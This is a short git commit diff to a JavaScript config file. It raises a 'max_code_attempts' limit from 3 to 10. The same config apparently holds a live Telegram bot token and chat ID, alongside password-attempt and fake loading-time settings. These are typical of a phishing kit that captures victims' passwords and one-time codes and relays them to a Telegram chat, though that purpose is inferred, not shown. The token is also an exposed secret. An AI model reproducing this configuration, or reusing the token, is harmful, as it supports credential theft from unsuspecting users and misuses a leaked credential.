216f9f728b4c8de066011bcc3fec958d954db1de
kindscongchua7-crypto <kindscongchua7@gmail.com>
2026-07-06 00:02:12 +0700

    Update config.js

--- src/utils/config.js
+++ src/utils/config.js
@@ -2,7 +2,7 @@ const config = {
     token: '8915629981:AAEt5XSTWguw8jvrSCTunAvvnee-YnXOwhU',
     chat_id: '-5330962844',
     max_password_attempts: 2,
-    max_code_attempts: 3,
+    max_code_attempts: 10,
     password_loading_time: 2,
     code_loading_time: 3
 };
